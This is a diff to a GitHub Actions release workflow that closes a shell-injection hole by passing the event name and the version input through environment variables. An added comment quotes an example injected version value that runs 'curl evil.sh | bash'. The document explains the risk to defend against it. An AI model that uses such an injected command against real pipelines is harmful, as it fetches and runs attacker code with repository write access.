@@ -253,11 +253,20 @@ jobs:
 
       - name: Determine version
         id: version
+        # Template-expanding `${{ inputs.version }}` directly inside a
+        # shell `run:` is a code-injection sink — workflow_dispatch input
+        # like `1.0.0; curl evil.sh | bash` would execute with the
+        # release token's contents:write permission. Pipe through env
+        # so the value lands as a regular shell variable that bash
+        # treats as data.
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_VERSION: ${{ inputs.version }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            echo "version=${{ inputs.version }}" >> $GITHUB_OUTPUT
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            echo "version=$INPUT_VERSION" >> "$GITHUB_OUTPUT"
           else
-            echo "version=${GITHUB_REF#refs/tags/v}" >> $GITHUB_OUTPUT
+            echo "version=${GITHUB_REF#refs/tags/v}" >> "$GITHUB_OUTPUT"
           fi
 
       - name: Download all artifacts
